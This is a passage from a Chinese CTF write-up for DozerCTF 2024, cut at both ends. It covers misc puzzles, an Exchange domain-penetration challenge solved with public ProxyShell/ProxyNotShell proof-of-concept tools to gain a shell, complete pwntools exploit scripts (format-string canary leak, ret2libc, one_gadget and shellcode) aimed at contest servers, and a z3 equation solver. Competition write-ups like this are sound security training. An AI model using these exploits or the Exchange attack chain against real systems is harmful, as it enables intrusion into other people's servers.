class="hljs-title">filter</span>/<span class="hljs-title">function</span>.<span class="hljs-title">php</span>/<span class="hljs-title">convert</span>.<span class="hljs-title">base64</span>-<span class="hljs-title">encode</span>/<span class="hljs-title">resource</span>=<span class="hljs-title">dozer_f1ag</span>.<span class="hljs-title">php</span></span><br></code></pre></td></tr></table></figure><p>解一下base64<img src="/../../images/dozerctf2024/ser.png" alt="ser"></p><h2 id="上春山"><a class="markdownIt-Anchor" href="#上春山"></a> 上春山</h2><p>二月天杨柳醉春烟…搞错了，看题目。</p><p>什么玩意，我自己整理了一下<img src="/../../images/dozerctf2024/%E4%B8%8A%E6%98%A5%E5%B1%B1.png" alt="上春山"></p><p>分析一下，一开始对暗号，然后聊天说东方有沉船搞个门路赚钱，最后flag应该和沉船有关系。说到这就应该好好拷打出题人了</p><p>官方给了提示不一定在国内，出名的奢侈的。</p><p>我们锁定范围(1911-1949年，出名，国外，奢侈，沉船)</p><p>这不就是出名的泰坦尼克号嘛，最后官方说的知道船可以问，直接给我一串汉字，我们谦虚一下，面向答案的wp写一下。</p><p>载柳度载汪分中中申申秒载爱度中申分载中句月秒</p><p>根据江湖黑话，上面的应该都是数字转化而来的，也就是当时沉船的经纬度转黑话，黑话再转MD5就行，最后就是flag.(好好拷打出题人)</p><h2 id="se"><a class="markdownIt-Anchor" href="#se"></a> se</h2><p>wav的题目，一般都挺简单的吧</p><p>听一下类似电话拨号的声音，网上的网站一把梭</p><p><img src="/../../images/dozerctf2024/se.png" alt="se"></p><p>962764453，卡壳了不知道接下来怎么写，emmmmm</p><p>还好有万能的队友，用silenteye可以提出zip，再用这个密码就可以得到flag了。</p><h2 id="shuiyin"><a class="markdownIt-Anchor" href="#shuiyin"></a> shuiyin</h2><p>嘿嘿，出题人总是不仔细啊，直接给flag也没下，那我接着面向答案的wp了。</p><p>按道理应该是最右边的图片，猜测是盲水印，拖到软件里面解一下就行了吧，然后可以得到flag,(估计本来就简单，上的太匆忙了)</p><h2 id="问卷"><a class="markdownIt-Anchor" href="#问卷"></a> 问卷</h2><p>正常答题就行，最后想抢手速也是于事无补。</p><p>以下部分由队友完成我只是负责拼装。</p><h2 id="简单的域渗透iii-flag1"><a class="markdownIt-Anchor" href="#简单的域渗透iii-flag1"></a> 简单的域渗透III-flag1</h2><p>发现被重定向</p><p><img src="/../../images/dozerctf2024/flag1.png" alt="flag1"></p><p>根据题目发现是exchange+office365</p><p><img src="/../../images/dozerctf2024/flag3.png" alt="flag3"></p><p>查阅文章<a href="https://mp.weixin.qq.com/s/O6a40449vTKWUXS4kwD9xA">记一次曲折的exchange漏洞利用-ProxyMaybeShell (qq.com)</a></p><p>proxyshell一梭拿到token</p><p>脚本代码：</p><p><a href="https://github.com/dmaasland/proxyshell-poc">https://github.com/dmaasland/proxyshell-poc</a></p><p><img src="/../../images/dozerctf2024/flag4.png" alt="flag4"></p><p>从github上撸到<a href="https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/proxymaybeshell/ProxyMaybeShell-main/proxynotshellfileWrite.py#L3%E7%9B%B4%E6%8E%A5%E4%B8%80%E6%8A%8A%E6%A2%AD">https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/proxymaybeshell/ProxyMaybeShell-main/proxynotshellfileWrite.py#L3直接一把梭</a></p><p><img src="/../../images/dozerctf2024/flag5.png" alt="flag5"></p><p><img src="/../../images/dozerctf2024/flag6.png" alt="flag6"></p><p>拿到shell</p><p>群里桌面和vpn两hint，找到如下</p><p><img src="/../../images/dozerctf2024/flag7.png" alt="flag7"></p><p>tar解压取出password</p><p><img src="/../../images/dozerctf2024/flag8.png" alt="flag8"></p><p><img src="/../../images/dozerctf2024/flag9.png" alt="flag9"></p><p>flag{b5c1cd1c-45d8-4c5e-bf2e-d2b87419248f}</p><h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> PWN</h1><h2 id="一个不对劲的溢出"><a class="markdownIt-Anchor" href="#一个不对劲的溢出"></a> 一个不对劲的溢出</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;139.196.237.232&#x27;</span>,<span class="hljs-number">32916</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>payload = <span class="hljs-string">&#x27;aa%37$pbb%36$pcc%35$p&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&#x27;username?\n&#x27;</span>,payload)<br>p.recvuntil(<span class="hljs-string">&#x27;aa&#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">231</span>-libc.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;libc_base--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>p.recvuntil(<span class="hljs-string">&#x27;bb&#x27;</span>)<br>pie = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0x0000A20</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;pie--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(pie))<br>p.recvuntil(<span class="hljs-string">&#x27;cc&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">18</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;canary--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(canary))<br>pop_rdi = <span class="hljs-number">0x00a83</span>+pie<br>system = libc_base+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libc_base+<span class="hljs-number">0x001b3d88</span><br>ret = <span class="hljs-number">0x000A84</span><br>main = pie+<span class="hljs-number">0x0007F0</span><br>og = [<span class="hljs-number">0x4f2be</span>,<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]<br>og_yuan = [<span class="hljs-number">0x4f29e</span>,<span class="hljs-number">0x4f2a5</span>,<span class="hljs-number">0x4f302</span>,<span class="hljs-number">0x10a2fc</span>]<br>shell = libc_base+og_yuan[<span class="hljs-number">0</span>]<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0xd0</span>-<span class="hljs-number">0x8</span>)+p64(canary)+<span class="hljs-string">b&#x27;bbbbbbbb&#x27;</span><br><span class="hljs-comment">#payload+= p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)</span><br>payload+= p64(shell)<br>p.send(payload)<br>p.sendline(<span class="hljs-string">&#x27;exec 1&gt;&amp;0&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="mid_pwn"><a class="markdownIt-Anchor" href="#mid_pwn"></a> mid_pwn</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>p = remote(<span class="hljs-string">&#x27;139.196.237.232&#x27;</span>,<span class="hljs-number">32972</span>)<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rdi, 0x67616c66</span><br><span class="hljs-string">push rdi</span><br><span class="hljs-string">xor rdi, rdi</span><br><span class="hljs-string">sub rdi, 100</span><br><span class="hljs-string">mov rsi, rsp</span><br><span class="hljs-string">xor rdx, rdx</span><br><span class="hljs-string">xor r10, r10</span><br><span class="hljs-string">mov rax, SYS_openat</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">push 3</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string">push 0x1</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string">push 0x100</span><br><span class="hljs-string">lea rbx, [rsp-8]</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">mov rsi, rsp</span><br><span class="hljs-string">push SYS_readv</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">push 1</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string">push 0x1</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string">push 0x100</span><br><span class="hljs-string">lea rbx, [rsp+8]</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">mov rsi, rsp</span><br><span class="hljs-string">push SYS_writev</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">231</span>+asm(shellcode)<br>p.sendlineafter(<span class="hljs-string">b&#x27;show me\n&#x27;</span>,shellcode)<br>p.recv()<br></code></pre></td></tr></table></figure><h2 id="ezpwn"><a class="markdownIt-Anchor" href="#ezpwn"></a> ezpwn</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br> <br>p = remote(<span class="hljs-string">&#x27;139.196.237.232&#x27;</span>,<span class="hljs-number">32944</span>)<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = cdll.LoadLibrary(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br>glibc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>seed = libc.time(<span class="hljs-number">0</span>)<br>password = libc.rand(libc.srand(seed))<br>p.sendafter(<span class="hljs-string">&#x27;account:&#x27;</span>,<span class="hljs-string">&#x27;xiaochange&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;password:&#x27;</span>,<span class="hljs-built_in">str</span>(password))<br>pop_rdi = <span class="hljs-number">0x004014d3</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+<span class="hljs-string">b&#x27;bbbbbbbb&#x27;</span><br>payload+= p64(pop_rdi)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>payload+= p64(<span class="hljs-number">0x000401423</span>)<br>p.sendafter(<span class="hljs-string">&#x27;something\n&#x27;</span>,payload)<br>p.recvuntil(<span class="hljs-string">&#x27;bye~~\n&#x27;</span>)<br>libc_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-glibc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>og = [<span class="hljs-number">0xe3afe</span>,<span class="hljs-number">0xe3b01</span>,<span class="hljs-number">0xe3b04</span>]<br>seed = libc.time(<span class="hljs-number">0</span>)<br>password = libc.rand(libc.srand(seed))<br>shell = libc_addr+og[<span class="hljs-number">1</span>]<br>p.sendafter(<span class="hljs-string">&#x27;account:&#x27;</span>,<span class="hljs-string">&#x27;xiaochange&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;password:&#x27;</span>,<span class="hljs-built_in">str</span>(password))<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+<span class="hljs-string">b&#x27;bbbbbbbb&#x27;</span><br>payload+= p64(shell)<br>p.sendafter(<span class="hljs-string">&#x27;something\n&#x27;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="re"><a class="markdownIt-Anchor" href="#re"></a> RE</h1><h2 id="pppyyy"><a class="markdownIt-Anchor" href="#pppyyy"></a> pppyyy</h2><p>将pyc反编译，解方程组</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *  <br><br><span class="hljs-comment"># 创建 14 个未知数  </span><br>nums = [Real(<span class="hljs-string">&#x27;nums%d&#x27;</span> % i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">14</span>)]  <br><br>eqns = [  <br>(((((nums[<span class="hljs-number">0</span>] * <span class="hljs-number">2</span> + nums[<span class="hljs-number">1</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">2</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">3</span>] - <span class="hljs-number">3</span>) + nums[<span class="hljs-number">4</span>] * <span class="hljs-number">5</span> + nums[<span class="hljs-number">5</span>] * <span class="hljs-number">5</span> - nums[<span class="hljs-number">6</span>] - <span class="hljs-number">3</span>) + nums[<span class="hljs-number">7</span>] + <span class="hljs-number">2</span> - nums[<span class="hljs-number">8</span>]) + <span class="hljs-number">3</span> + nums[<span class="hljs-number">9</span>] - <span class="hljs-number">3</span> - nums[<span class="hljs-number">10</span>] * <span class="hljs-number">4</span>) + nums[<span class="hljs-number">11</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">12</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">13</span>] + <span class="hljs-number">3</span> == <span class="hljs-number">56</span>,<br>((((nums[<span class="hljs-number">0</span>] + <span class="hljs-number">2</span> - nums[<span class="hljs-number">1</span>] * <span class="hljs-number">5</span>) + nums[<span class="hljs-number">2</span>] - <span class="hljs-number">3</span> - nums[<span class="hljs-number">3</span>]) + <span class="hljs-number">5</span> - nums[<span class="hljs-number">4</span>] * <span class="hljs-number">4</span> - nums[<span class="hljs-number">5</span>]) + <span class="hljs-number">5</span> + nums[<span class="hljs-number">6</span>] * <span class="hljs-number">4</span> + nums[<span class="hljs-number">7</span>] * <span class="hljs-number">5</span> + nums[<span class="hljs-number">8</span>] * <span class="hljs-number">3</span> + nums[<span class="hljs-number">9</span>] * <span class="hljs-number">5</span> - nums[<span class="hljs-number">10</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">11</span>] - <span class="hljs-number">2</span> - nums[<span class="hljs-number">12</span>] - <span class="hljs-number">5</span>) + nums[<span class="hljs-number">13</span>] - <span class="hljs-number">3</span> == <span class="hljs-number">681</span>,<br>(((nums[<span class="hljs-number">0</span>] * <span class="hljs-number">5</span> + nums[<span class="hljs-number">1</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">2</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">3</span>] * <span class="hljs-number">4</span> + nums[<span class="hljs-number">4</span>] - <span class="hljs-number">3</span>) + nums[<span class="hljs-number">5</span>] * <span class="hljs-number">4</span> + nums[<span class="hljs-number">6</span>] * <span class="hljs-number">4</span> + nums[<span class="hljs-number">7</span>] + <span class="hljs-number">3</span> - nums[<span class="hljs-number">8</span>] * <span class="hljs-number">2</span> - nums[<span class="hljs-number">9</span>]) + <span class="hljs-number">3</span> + nums[<span class="hljs-number">10</span>] + <span class="hljs-number">3</span> - nums[<span class="hljs-number">11</span>] * <span class="hljs-number">2</span> - nums[<span class="hljs-number">12</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">13</span>] * <span class="hljs-number">2</span> == <span class="hljs-number">1129</span>,<br>(((((nums[<span class="hljs-number">0</span>] * <span class="hljs-number">5</span> - nums[<span class="hljs-number">1</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">2</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">3</span>] + <span class="hljs-number">5</span> - nums[<span class="hljs-number">4</span>]) + <span class="hljs-number">3</span> + nums[<span class="hljs-number">5</span>] * <span class="hljs-number">2</span> + nums[<span class="hljs-number">6</span>] + <span class="hljs-number">2</span> - nums[<span class="hljs-number">7</span>] * <span class="hljs-number">4</span> - nums[<span class="hljs-number">8</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">9</span>] + <span class="hljs-number">5</span> + nums[<span class="hljs-number">10</span>] + <span class="hljs-number">4</span> - nums[<span class="hljs-number">11</span>]) + <span class="hljs-number">3</span> + nums[<span class="hljs-number">12</span>] + <span class="hljs-number">3</span> - nums[<span class="hljs-number">13</span>] * <span class="hljs-number">5</span> == <span class="hljs-number">55</span>,<br>((((nums[<span class="hljs-number">0</span>] + <span class="hljs-number">2</span> - nums[<span class="hljs-number">1</span>] * <span class="hljs-number">4</span> - nums[<span class="hljs-number">2</span>] * <span class="hljs-number">3</span>) + nums[<span class="hljs-number">3</span>] + <span class="hljs-number">3</span> + nums[<span class="hljs-number">4</span>] * <span class="hljs-number">4</span> + nums[<span class="hljs-number">5</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">6</span>]) + <span class="hljs-number">5</span> + nums[<span class="hljs-number">7</span>] - <span class="hljs-number">2</span> - nums[<span class="hljs-number">8</span>]) + <span class="hljs-number">5</span> + nums[<span class="hljs-number">9</span>] * <span class="hljs-number">4</span> - nums[<span class="hljs-number">10</span>] - <span class="hljs-number">2</span> - nums[<span class="hljs-number">11</span>] - <span class="hljs-number">4</span>) + nums[<span class="hljs-number">12</span>] * <span class="hljs-number">5</span> - nums[<span class="hljs-number">13</span>] - <span class="hljs-number">4</span> == <span class="hljs-number">673</span>,<br>(((((nums[<span class="hljs-number">0</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">1</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">2</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">3</span>]) + <span class="hljs-number">2</span> + nums[<span class="hljs-number">4</span>] * <span class="hljs-number">4</span> - nums[<span class="hljs-number">5</span>]) + <span class="hljs-number">4</span> + nums[<span class="hljs-number">6</span>] + <span class="hljs-number">3</span> + nums[<span class="hljs-number">7</span>] + <span class="hljs-number">5</span> - nums[<span class="hljs-number">8</span>] * <span class="hljs-number">5</span> - nums[<span class="hljs-number">9</span>]) + <span class="hljs-number">2</span> + nums[<span class="hljs-number">10</span>] + <span class="hljs-number">2</span> + nums[<span class="hljs-number">11</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">12</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">13</span>]) + <span class="hljs-number">4</span> == <span class="hljs-number">249</span>,<br>((((((nums[<span class="hljs-number">0</span>] * <span class="hljs-number">4</span> + nums[<span class="hljs-number">1</span>] - <span class="hljs-number">4</span>) + nums[<span class="hljs-number">2</span>] - <span class="hljs-number">5</span>) + nums[<span class="hljs-number">3</span>] - <span class="hljs-number">2</span> - nums[<span class="hljs-number">4</span>] * <span class="hljs-number">2</span>) + nums[<span class="hljs-number">5</span>] + <span class="hljs-number">3</span> + nums[<span class="hljs-number">6</span>] - <span class="hljs-number">3</span> - nums[<span class="hljs-number">7</span>]) + <span class="hljs-number">3</span> - nums[<span class="hljs-number">8</span>] * <span class="hljs-number">4</span> - nums[<span class="hljs-number">9</span>] * <span class="hljs-number">3</span>) + nums[<span class="hljs-number">10</span>] * <span class="hljs-number">2</span> + nums[<span class="hljs-number">11</span>] * <span class="hljs-number">5</span> + nums[<span class="hljs-number">12</span>] - <span class="hljs-number">4</span>) + nums[<span class="hljs-number">13</span>] - <span class="hljs-number">4</span> == <span class="hljs-number">422</span>,<br>((((((nums[<span class="hljs-number">0</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">1</span>] - <span class="hljs-number">3</span> - nums[<span class="hljs-number">2</span>] - <span class="hljs-number">3</span>) + nums[<span class="hljs-number">3</span>] - <span class="hljs-number">2</span> - nums[<span class="hljs-number">4</span>] - <span class="hljs-number">5</span>) + nums[<span class="hljs-number">5</span>] * <span class="hljs-number">2</span> + nums[<span class="hljs-number">6</span>] - <span class="hljs-number">4</span>) + nums[<span class="hljs-number">7</span>] - <span class="hljs-number">5</span>) + nums[<span class="hljs-number">8</span>] * <span class="hljs-number">5</span> - nums[<span class="hljs-number">9</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">10</span>]) + <span class="hljs-number">5</span> - nums[<span class="hljs-number">11</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">12</span>] * <span class="hljs-number">5</span>) + nums[<span class="hljs-number">13</span>] - <span class="hljs-number">4</span> == <span class="hljs-number">49</span>,<br>(((((((nums[<span class="hljs-number">0</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">1</span>]) + <span class="hljs-number">3</span> - nums[<span class="hljs-number">2</span>]) + <span class="hljs-number">4</span> - nums[<span class="hljs-number">3</span>] - <span class="hljs-number">4</span>) + nums[<span class="hljs-number">4</span>] + <span class="hljs-number">5</span> - nums[<span class="hljs-number">5</span>] * <span class="hljs-number">3</span>) + nums[<span class="hljs-number">6</span>] + <span class="hljs-number">2</span> + nums[<span class="hljs-number">7</span>] * <span class="hljs-number">4</span> - nums[<span class="hljs-number">8</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">9</span>]) + <span class="hljs-number">3</span> - nums[<span class="hljs-number">10</span>] * <span class="hljs-number">5</span>) + nums[<span class="hljs-number">11</span>] * <span class="hljs-number">2</span> + nums[<span class="hljs-number">12</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">13</span>]) + <span class="hljs-number">2</span> == <span class="hljs-number">0</span>,<br>(((((((nums[<span class="hljs-number">0</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">1</span>]) + <span class="hljs-number">5</span> - nums[<span class="hljs-number">2</span>] - <span class="hljs-number">4</span>) + nums[<span class="hljs-number">3</span>] + <span class="hljs-number">3</span> + nums[<span class="hljs-number">4</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">5</span>] - <span class="hljs-number">4</span>) + nums[<span class="hljs-number">6</span>] * <span class="hljs-number">2</span> - nums[<span class="hljs-number">7</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">8</span>] * <span class="hljs-number">4</span>) + nums[<span class="hljs-number">9</span>] + <span class="hljs-number">4</span> + nums[<span class="hljs-number">10</span>] * <span class="hljs-number">4</span> - nums[<span class="hljs-number">11</span>]) + <span class="hljs-number">5</span> - nums[<span class="hljs-number">12</span>]) + <span class="hljs-number">4</span> + nums[<span class="hljs-number">13</span>] + <span class="hljs-number">4</span> == <span class="hljs-number">268</span>,<br>((((((nums[<span class="hljs-number">0</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">1</span>]) + <span class="hljs-number">3</span> - nums[<span class="hljs-number">2</span>]) + <span class="hljs-number">2</span> + nums[<span class="hljs-number">3</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">4</span>]) + <span class="hljs-number">4</span> + nums[<span class="hljs-number">5</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">6</span>]) + <span class="hljs-number">2</span> + nums[<span class="hljs-number">7</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">8</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">9</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">10</span>] - <span class="hljs-number">2</span> - nums[<span class="hljs-number">11</span>]) + <span class="hljs-number">5</span> + nums[<span class="hljs-number">12</span>] - <span class="hljs-number">3</span>) + nums[<span class="hljs-number">13</span>] + <span class="hljs-number">4</span> == -<span class="hljs-number">162</span>,<br>((((((((nums[<span class="hljs-number">0</span>] + <span class="hljs-number">5</span> - nums[<span class="hljs-number">1</span>]) + <span class="hljs-number">4</span> + nums[<span class="hljs-number">2</span>] * <span class="hljs-number">5</span> - nums[<span class="hljs-number">3</span>] - <span class="hljs-number">3</span>) + nums[<span class="hljs-number">4</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">5</span>] - <span class="hljs-number">5</span>) + nums[<span class="hljs-number">6</span>] + <span class="hljs-number">3</span> - nums[<span class="hljs-number">7</span>] * <span class="hljs-number">5</span> - nums[<span class="hljs-number">8</span>] * <span class="hljs-number">3</span>) + nums[<span class="hljs-number">9</span>] - <span class="hljs-number">4</span>) + nums[<span class="hljs-number">10</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">11</span>] - <span class="hljs-number">3</span>) + nums[<span class="hljs-number">12</span>] - <span class="hljs-number">5</span>) + nums[<span class="hljs-number">13</span>] + <span class="hljs-number">2</span> == -<span class="hljs-number">2</span>,<br>((((nums[<span class="hljs-number">0</span>] + <span class="hljs-number">4</span> + nums[<span class="hljs-number">1</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">2</span>]) + <span class="hljs-number">3</span> + nums[<span class="hljs-number">3</span>] + <span class="hljs-number">3</span> - nums[<span class="hljs-number">4</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">5</span>]) + <span class="hljs-number">3</span> + nums[<span class="hljs-number">6</span>] - <span class="hljs-number">3</span> - nums[<span class="hljs-number">7</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">8</span>]) + <span class="hljs-number">3</span> + nums[<span class="hljs-number">9</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">10</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">11</span>] + <span class="hljs-number">5</span> + nums[<span class="hljs-number">12</span>] * <span class="hljs-number">5</span> - nums[<span class="hljs-number">13</span>] - <span class="hljs-number">5</span> == <span class="hljs-number">433</span>,<br>(((((nums[<span class="hljs-number">0</span>] + <span class="hljs-number">4</span> + nums[<span class="hljs-number">1</span>] + <span class="hljs-number">4</span> + nums[<span class="hljs-number">2</span>] + <span class="hljs-number">3</span> - nums[<span class="hljs-number">3</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">4</span>] - <span class="hljs-number">4</span>) + nums[<span class="hljs-number">5</span>] + <span class="hljs-number">3</span> - nums[<span class="hljs-number">6</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">7</span>] * <span class="hljs-number">2</span>) + nums[<span class="hljs-number">8</span>] - <span class="hljs-number">3</span>) + 